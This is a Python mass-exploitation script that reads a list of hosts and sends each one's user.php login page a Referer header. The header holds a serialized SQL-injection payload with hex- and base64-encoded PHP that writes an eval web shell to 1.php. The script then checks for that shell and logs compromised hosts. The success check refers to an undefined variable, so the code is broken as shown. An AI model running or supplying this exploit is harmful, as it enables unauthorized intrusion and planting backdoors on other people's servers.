#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import time
exp="554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}"

url_s=list(open('url.txt'))

for address in url_s:
  try:

    http_url="http://"+address.strip()+"/user.php?act=login"
    headers ={
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
      'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
      'Referer':exp,
      'Accept-Encoding': 'gzip, deflate'
    }

    p_one=requests.get(url=http_url,headers=headers)
    shell_url="http://"+address.strip()+"/1.php"
    time.sleep(2)
    p_two=requests.get(url=url2)
    if p_two.status_code==200:
      print("shell: "+shell_url)
      f=open("success.txt","a")
      shell_url=shell_url.replace(' ','')
      f.write(shell_url+'\n')
      f.close()
    else:
      print("No Vulns")
  except Exception as e:
      print("No Vulns")
